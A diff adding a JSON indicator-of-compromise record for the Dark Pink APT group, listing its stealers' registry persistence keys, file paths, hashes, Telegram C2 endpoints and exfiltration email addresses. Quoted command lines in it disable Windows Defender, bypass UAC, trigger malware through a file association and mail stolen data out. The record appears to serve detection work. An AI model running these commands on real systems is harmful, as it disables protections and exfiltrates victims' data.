@@ -1,0 +1,336 @@
+{
+  "malware_family": "Dark Pink",
+  "threat_actor": "Dark Pink",
+  "platforms": [
+    "windows"
+  ],
+  "summary": "Dark Pink is a new APT group targeting government and military entities, primarily in the APAC region, for espionage. They employ a custom toolkit including TelePowerBot, KamiKakaBot, and Cucky/Ctealer stealers, delivered via spear-phishing with ISO images. The malware uniquely uses Telegram for C2, establishes persistence by changing default file associations, and propagates through USB infection.",
+  "mitre_techniques": [
+    "T1574.002",
+    "T1546.001"
+  ],
+  "host_artifacts": [
+    {
+      "kind": "pdb_path",
+      "value": "C:\\Users\\hoang\\source\\repos\\Cucky\\Cucky\\obj\\Release\\net46\\Cucky.pdb",
+      "context": "PDB path found in the Cucky stealer sample.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "pdb_path",
+      "value": "C:\\Users\\build\\source\\repos\\CtealWebCredential\\Release\\CtealWebCredential.pdb",
+      "context": "PDB path found in the Ctealer stealer sample.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "mutex",
+      "value": "gwgXSznM-Jz92k33A-uRcCCksA-9XAU93r5",
+      "context": "Mutex created by the malicious DLL (TelePowerDropper) on launch.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "registry_key",
+      "value": "HKCU\\Environment\\UserInitMprLogonScript",
+      "context": "Registry key used to gain persistence for TelePowerBot.",
+      "specificity": "medium",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "registry_key",
+      "value": "HKCU\\SOFTWARE\\Classes\\.abcd",
+      "context": "File association created to trigger malicious PowerShell.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "registry_key",
+      "value": "HKCU\\SOFTWARE\\Classes\\abcdfile\\shell\\abcd",
+      "context": "Registry key storing the base64-encoded, encrypted TelePowerBot payload.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "registry_key",
+      "value": "HKCU\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell",
+      "context": "Persistence mechanism for KamiKakaBot, launching MSBuild with a malicious XML.",
+      "specificity": "medium",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "registry_key",
+      "value": "HKCU\\Environment\\guid",
+      "context": "Registry key used by TelePowerBot to store the unique victim identifier.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "forfiles.exe /p %system32% /m notepad.exe /c \"cmd.exe /c whoami >> %appdata%\\a.abcd && %appdata%\\a.abcd && exit\"",
+      "context": "Value of UserInitMprLogonScript key, triggers the .abcd file association handler.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "Set-MpPreference -DisableRealtimeMonitoring $true -Force -ea 0;",
+      "context": "Part of a larger script to disable multiple Windows Defender features.",
+      "specificity": "medium",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "[NETLUA.Main]::BypassUAC(\"powershell\\\", \\\"-c {$command}\\\")",
+      "context": "Command to bypass UAC using a custom .NET application.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "Send-MailMessage -To \"blackpink.301@outlook.com\" -From \"blackred.113@outlook.com\"",
+      "context": "Part of a PowerShell command to exfiltrate data via email.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "%TEMP%\\backuplog",
+      "context": "Folder where Cucky and Ctealer save stolen data.",
+      "specificity": "medium",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "%TEMP%\\KoVosRLvmU\\",
+      "context": "Folder where ZMsg stores exfiltrated Zalo messenger data.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "%TEMP%\\record",
+      "context": "Folder for storing microphone recordings captured with psr.exe.",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "system.bat",
+      "context": "Batch file created on USB drives for lateral movement.",
+      "specificity": "medium",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "*.abcd",
+      "context": "Custom file extension used to trigger malware execution via file association.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "select * from __InstanceCreationEvent within 5 where TargetInstance ISA 'Win32_LogicalDisk' and TargetInstance.DriveType = 2",
+      "context": "WMI event query to detect USB drive insertion for lateral movement.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "messageView",
+      "context": "UI element name ZMsg iterates to find messages in Zalo messenger.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "FlaUI",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "yyyyMMddHHmmss",
+      "context": "Date/time format string for naming screenshots and microphone recordings.",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "@echo off\\ncd %cd%dism\\nstart dism.exe\\nexit",
+      "context": "Content of system.bat file used for lateral movement via USB.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "scheduled_task",
+      "value": "Microsoft Idle",
+      "context": "Scheduled task name used by Dark Pink.",
+      "specificity": "medium",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "assembly_name",
+      "value": "Cucky",
+      "context": "Assembly name for the Cucky stealer, derived from PDB path.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "other",
+      "value": "PowerSploit/Get-MicrophoneAudio",
+      "context": "Publicly available module used to record microphone audio.",
+      "specificity": "medium",
+      "evidence": "explicit_literal",
+      "origin_tool": "PowerSploit",
+      "hash_algo": "",
+      "hash_value": ""
+    }
+  ],
+  "network_artifacts": [
+    {
+      "kind": "other",
+      "value": "blackpink.301@outlook.com",
+      "context": "Recipient email address for data exfiltration.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": ""
+    },
+    {
+      "kind": "other",
+      "value": "blackred.113@outlook.com",
+      "context": "Sender email address for data exfiltration.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": ""
+    },
+    {
+      "kind": "other",
+      "value": "alibaba.113@outlook.com",
+      "context": "Email address used for data exfiltration.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "https://api.telegram.org/bot$token/getUpdates",
+      "context": "TelePowerBot C2 endpoint for polling new tasks.",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "https://api.telegram.org/bot$token/sendDocument",
+      "context": "TelePowerBot C2 endpoint for exfiltrating documents.",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "https://ifconfig.me/ip",
+      "context": "External service used by TelePowerBot to get the victim's public IP.",
+      "specificity": "low",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "https://raw.githubusercontent.com/efimovah/abcd/main/xxx.gif",
+      "context": "URL hosting payload for USB-based lateral movement.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": ""
+    }
+  ],
+  "samples": [
+    {
+      "sha256": "9976625B5A3035DC68E878AD5AC3682CCB74EF2007C501C8023291548E11301A",
+      "description": "Cucky stealer"
+    },
+    {
+      "sha256": "C60F778641942B7B0C00F3214211B137B683E8296ABB1905D2557BFB245BF775",
+      "description": "Ctealer Loader"
+    },
+    {
+      "sha256": "E3181EE97D3FFD31C22C2C303C6E75D0196912083D0C21536E5833EE7D108736",
+      "description": "Packed Ctealer"
+    },
+    {
+      "sha256": "E45DF7418CA47A9A4C4803697F4B28C618469C6E5A5678213AB81DF9FCC9FD51",
+      "description": "Packed Ctealer"
+    }
+  ],
+  "file_types": [
+    "pe",
+    "dotnet",
+    "script",
+    "document"
+  ]
+}
